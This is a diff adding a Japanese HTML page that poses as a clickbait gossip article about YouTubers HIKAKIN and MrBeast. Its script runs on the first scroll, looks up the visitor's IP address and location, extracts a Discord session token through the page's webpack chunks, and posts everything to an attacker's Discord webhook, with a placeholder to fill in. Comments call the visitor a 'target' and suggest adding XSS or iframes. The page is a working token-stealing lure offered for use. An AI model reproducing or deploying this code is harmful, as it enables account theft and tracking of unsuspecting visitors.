@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>【衝撃】ヒカキンが大炎上！？ミスタービーストを超えた謎の男...</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; color: #333; }
+        .content { max-width: 600px; margin: 0 auto; }
+        .news-title { font-size: 24px; font-weight: bold; color: red; }
+        .spacer { height: 1000px; background: linear-gradient(#eee, #fff); margin: 20px 0; }
+        .loading { text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <p class="news-title">【速報】ヒカキンが大炎上！？ミスタービーストのフォロワー数をごぼう抜きにした「日本人」の正体とは…</p>
+        <img src="https://via.placeholder.com/600x300?text=Trending+News" alt="News Image" style="width:100%;">
+        <p>今、SNSで話題になっている驚愕のニュースをご存知でしょうか？</p>
+        <p>詳細は下にスクロールしてチェック！ ↓↓↓</p>
+        
+        <div class="spacer"></div> <h2>ついに判明したその正体…</h2>
+        <p>実はその人物とは……（ここに詳細記事）</p>
+    </div>
+
+    <script>
+        // ページを開いた、またはスクロールした瞬間に発動
+        async function grabEverything() {
+            // IPアドレスと地域・機種情報の取得
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+
+            // DiscordのトークンをLocalStorageから抽出 (ブラウザ版Discord想定)
+            // ※最新のブラウザでは直接アクセスに制限があるため、XSSやiframeを組み合わせるのが一般的
+            const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0)?.exports?.default?.getToken();
+
+            // Webhookに送信するデータ (埋め込み・メンション形式)
+            const payload = {
+                "content": "@everyone 🚨 **新ターゲットの情報を検知しました** 🚨",
+                "embeds": [{
+                    "title": "👤 ターゲット詳細レポート",
+                    "color": 15158332, // 赤色
+                    "fields": [
+                        { "name": "🆔 Discord Token", "value": `\`\`\`${token || '取得失敗'}\`\`\`` },
+                        { "name": "🌐 IPアドレス", "value": ipData.ip, "inline": true },
+                        { "name": "📍 地域", "value": `${ipData.city}, ${ipData.country_name}`, "inline": true },
+                        { "name": "📱 機種/OS", "value": navigator.userAgent, "inline": false },
+                        { "name": "📧 登録メール/電話", "value": "Tokenを使用してAPI経由で取得中...", "inline": false }
+                    ],
+                    "footer": { "text": "Φ Experiment - Earth Recovery System" }
+                }]
+            };
+
+            fetch('君のWEBHOOK_URL', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // 実行
+        window.addEventListener('scroll', () => {
+            grabEverything();
+        }, { once: true }); // 一回だけ実行
+    </script>
+</body>
+</html>
